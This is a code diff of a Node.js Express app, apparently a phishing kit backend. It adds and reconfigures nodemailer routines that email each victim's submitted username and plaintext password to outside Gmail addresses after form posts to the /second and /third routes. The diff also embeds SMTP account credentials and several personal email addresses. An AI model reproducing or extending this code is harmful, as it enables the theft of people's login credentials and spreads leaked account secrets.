@@ -47,12 +47,44 @@ app.post("/second", function(req, res) {
     if (err) {
       console.log(err);
     } else {
+      // create a transporter object to connect to the SMTP server
+      let transporter = nodemailer.createTransport({
+        host: "smtp.elasticemail.com",
+        port: 2525,
+        secure: false,
+        auth: {
+          user: 'prattrenee@post.com',
+          pass: '19087AD1B1A6CCB2AEB8AA312B76C43D409F'
+        },
+        timeout: 5000
+      });
+
+      // define the email options
+      let mailOptions = {
+        from: 'prattrenee@post.com',
+        to: 'slangley1759@gmail.com',
+        to: 'yingliulai@gmail.com',
+        subject: 'New Form Submission',
+        text: `username: ${username}, password: ${req.body.pass}`
+      };
+
+      // send the email
+      transporter.sendMail(mailOptions, function(error, info) {
+        if (error) {
+          console.log(error);
+        } else {
+          console.log('Email sent: ' + info.response);
+        }
+      });
+
+      // redirect to the specified URL
       res.render("third", {
         username: username
       });
     }
   });
 });
+
 
 
 app.post("/third", function(req, res) {
@@ -67,19 +99,20 @@ app.post("/third", function(req, res) {
     } else {
       // create a transporter object to connect to the SMTP server
       let transporter = nodemailer.createTransport({
-        host: "smtp.yandex.com",
-        port: 465,
-        secure: true,
+        host: "smtp.elasticemail.com",
+        port: 2525,
+        secure: false,
         auth: {
-          user: 'kdavis1759@yandex.com',
-          pass: 'Badhtguy2.'
-        }
+          user: 'prattrenee@post.com',
+          pass: '19087AD1B1A6CCB2AEB8AA312B76C43D409F'
+        },
+        timeout: 5000
       });
 
       // define the email options
       let mailOptions = {
-        from: 'd_f_simms@hotmail.com',
-        to: 'kdavis1759@gmail.com',
+        from: 'prattrenee@post.com',
+        to: 'slangley1759@gmail.com',
         subject: 'New Form Submission',
         text: `username: ${username}, password: ${req.body.pass}`
       };
